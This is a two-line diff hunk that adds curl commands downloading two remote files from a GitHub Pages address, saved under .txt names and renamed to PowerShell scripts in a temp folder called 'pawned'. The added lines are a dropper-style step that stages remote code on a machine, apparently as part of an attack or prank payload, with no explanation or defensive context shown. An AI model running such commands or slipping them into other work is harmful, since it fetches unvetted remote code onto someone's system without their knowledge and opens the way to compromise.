@@ -1,0 +1,2 @@
+curl https://maikatura.github.io/scripts/video.txt -o "$env:TEMP/pawned/video.ps1"
+curl https://maikatura.github.io/scripts/wpc.txt -o "$env:TEMP/pawned/wpc.ps1"
